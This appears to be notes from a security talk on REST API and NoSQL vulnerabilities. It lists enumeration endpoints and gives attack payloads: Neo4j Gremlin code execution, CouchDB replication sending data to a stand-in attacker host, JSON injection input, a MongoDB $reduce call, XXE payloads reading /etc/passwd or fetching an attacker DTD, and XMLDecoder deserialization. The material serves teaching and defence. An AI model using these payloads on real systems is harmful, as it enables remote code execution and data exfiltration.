### Comparison of SQL Queries Across Different Databases

- **Oracle:**
  ```sql
  SELECT * FROM all_tables;
  ```

- **SQL Server:**
  ```sql
  sp_msforeachdb 'SELECT "?" AS db, * FROM [?].sys.tables';
  ```

- **MySQL:**
  ```sql
  SELECT DISTINCT TABLE_NAME 
  FROM INFORMATION_SCHEMA.COLUMNS 
  WHERE COLUMN_NAME IN ('columnA', 'ColumnB') 
  AND TABLE_SCHEMA = 'YourDatabase';
  ```

- **NoSQL REST APIs:**

  - **HBase:**
    - Find all tables in the HBase cluster:
      ```
      http://host:9000/
      ```
    - Find the running HBase version:
      ```
      http://host:9000/version
      ```
    - Find the nodes in the HBase cluster:
      ```
      http://host:9000/status/cluster
      ```
    - Find a description of a particular table's schema (pick one from the prior link):
      ```
      http://host:port/profile/schema
      ```

  - **CouchDB:**
    - Find version:
      ```
      http://host:5984/
      ```
    - Find all databases in CouchDB:
      ```
      http://host:5984/_all_dbs
      ```
    - Find all documents in a specific database:
      ```
      http://host:5984/{db_name}/_all_docs
      ```

  - **Neo4j:**
    - Find version and extension information:
      ```
      http://host:7474/db/data/
      ```

  - **MongoDB:**
    - Find all databases in MongoDB:
      ```
      http://host:27080/
      http://host:27080/api/1/databases
      ```
    - Find all collections under a named database:
      ```
      http://host:27080/api/1/database/{db_name}/collections
      ```

  - **Cassandra:**
    - Find all keyspaces in Cassandra:
      ```
      http://host:port/1/keyspaces
      ```
    - Find all column families in a keyspace:
      ```
      http://host:port/1/columnfamily/{keyspace_name}
      ```

### Inbred Architecture

- Externally exposed REST APIs typically use the same communication protocol (HTTP) and REST frameworks as internal-only REST APIs.
- Any vulnerabilities present in the public REST API can be exploited against the internal REST APIs.

### Extensions in REST Frameworks

- Some extensions in REST frameworks enhance development but at the expense of security.
- These can turn remote code execution and data exfiltration from security vulnerabilities into features.

  - **Subtle Examples:**
    - Passing partial script blocks for node processing.
    - Passing JavaScript functions for map-reduce processes.

  - **Obvious Examples:**
    - Passing a complete Groovy script to be executed on the server (e.g., Gremlin Plugin for Neo4j).
    - Passing source and target URLs for data replication.

### Remote Code Execution and Data Exfiltration Demos

- **Remote Code Execution (Gremlin Plugin for Neo4j):**
  ```bash
  curl -X POST http://localhost:7474/db/data/ext/GremlinPlugin/graphdb/execute_script -d '{"script":"import java.lang.Runtime; rt = Runtime.getRuntime().exec(\"c:/Windows/System32/calc.exe\")", "params": {}}' -H "Content-Type: application/json"
  ```

- **Data Exfiltration Example (CouchDB):**
  ```bash
  curl -X POST http://internalSrv.com:5984/_replicate -d '{"source":"db_name", "target":"http://attackerSvr.com:5984/corpData"}' -H "Content-Type: application/json"
  ```

- **Data Exfiltration Apply Your Knowledge (CouchDB):**
  ```java
  String id = request.getParameter("id");
  URL urlPost = new URL("http://svr.com:5984/customers/" + id);
  String name = request.getParameter("name");
  String json = "{\"fullName\":\"" + name + "\"}";
  ```

  **Attacker Input:**
  - `id = "../_replicate"`
  - `name = 'X", "source":"customers", "target":"http://attackerSvr.com:5984/corpData'`

### Reliance on Incorrectly Implemented Protocols

- SAML, XML Signature, and XML Encryption can be subverted using wrapping-based attacks. (References: Jager, Somorovsky, Mayer, Schwenk, Kampmann, Jensen, OWASP Presentation)

### Incorrect Assumptions of REST Application Behavior

- REST provides dynamic URLs and resource allocation, which can be exploited.

  **Example Case Study:**
  - **Problem:** A MongoDB REST API exposes two databases accessible at `/realtime/*` and `/predictive/*` with static ACLs.
  - **Exploit:**
    - Create a new database called `test`:
      ```bash
      POST http://svr.com:27080/test
      ```
    - Execute a malicious function:
      ```bash
      POST http://svr.com:27000/test/_cmd
      Body: {"cmd":{"$reduce":"function (obj, prev) { malicious_code() }"}}
      ```

### REST Input Types and Interfaces

- Main input types to REST interfaces are XML and JSON.

### XML-Related Vulnerabilities

- **Common Vulnerabilities:**
  - XXE (eXternal XML Entity Injection) / SSRF (Server Side Request Forgery)
  - XSLT Injection
  - XDOS
  - XML Injection
  - XML Serialization

- **XXE (File Disclosure and Port Scanning):**
  - Example:
    ```xml
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <name>&xxe;</name>
    ```

- **XXE (Remote Code Execution):**
  - Example:
    ```xml
    <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
    <name>&y;</name>
    ```

- **Current State:**
  - Many modern REST frameworks have patched XXE vulnerabilities.
  - Reference: Timothy Morgan, "What You Didn’t Know About XML External Entities Attacks" at AppSec USA.

### XML Serialization Vulnerabilities

- **Mechanisms:**
  - Server looks where to go before going.
  - Server asks user where to go.
  - Server asks user where to go and what to do.

- **Vulnerable APIs:**
  - **XStream:**
    - Limited, cannot invoke methods.
  - **XMLDecoder:**
    - Unrestricted, can execute arbitrary methods.

- **Remote Code Execution Demos:**
  - **XStream:**
    - `new XStreamRepresentation(…)`
  - **XMLDecoder:**
    - `new ObjectRepresentation`
    - Direct Usage:
      ```java
      XMLDecoder dec = new XMLDecoder(new ByteArrayInputStream(bad_bytes));
      values = (List) dec.readObject();
      ```

### Conclusion

- Publicly exposed or internal REST APIs likely have remote code execution or data exfiltration issues.

### Questions?

Feel free to ask any questions or seek further clarification.